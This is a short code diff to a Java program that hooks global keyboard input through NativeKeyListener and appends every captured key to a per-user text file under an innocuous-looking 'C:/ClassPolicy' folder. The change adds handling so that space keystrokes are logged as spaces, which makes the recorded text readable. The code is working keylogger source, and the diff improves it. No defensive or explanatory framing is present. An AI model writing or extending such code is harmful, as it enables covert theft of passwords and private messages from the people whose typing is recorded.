@@ -60,8 +60,13 @@ public class Main implements NativeKeyListener{
 			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
 			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
 			// System.out.println("rec " + x);
+			if(x.matches("Space")) {
+				out.print(" ");
+				out.close();
+			} else {
 			out.print(x);
 			out.close();
+			}
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -69,4 +74,3 @@ public class Main implements NativeKeyListener{
 	}
 	
 }
-
